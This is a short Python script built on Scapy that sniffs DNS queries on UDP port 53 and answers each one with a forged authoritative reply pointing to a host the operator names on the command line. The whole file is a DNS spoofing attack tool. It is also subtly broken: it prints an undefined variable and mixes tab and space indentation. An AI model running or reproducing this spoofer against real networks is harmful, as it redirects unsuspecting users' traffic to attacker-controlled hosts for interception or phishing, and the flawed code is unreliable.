from scapy.all import *
import argparse


spoof_target = None

def dnsSpoof(packet):
	dstip = packet[IP].src
	srcip = packet[IP].dst
	sport = packet[UDP].sport
	dport = packet[UDP].dport

	if packet.haslayer(DNSQR):
		dnsid = packet[DNS].id
		qd = packet[DNS].qd
		dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoof_target)
		spoof_packet = IP(dst=dstip, src=srcip)/UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
		send(spoof_packet, verbose=0)
		print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip))
		print(spoofPacket.summary())

def main():
	print('DSN SPOOF START...')
	sniff(filter='udp port 53', store=0, prn=dnsSpoof)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='This is a simple dns_spoofer using scapy')
    parser.add_argument('-t', type=str, required=True, metavar='HOST', help='target host name for spooffed dns packet')
    args = parser.parse_args()

	spoof_target = args.t
	main()
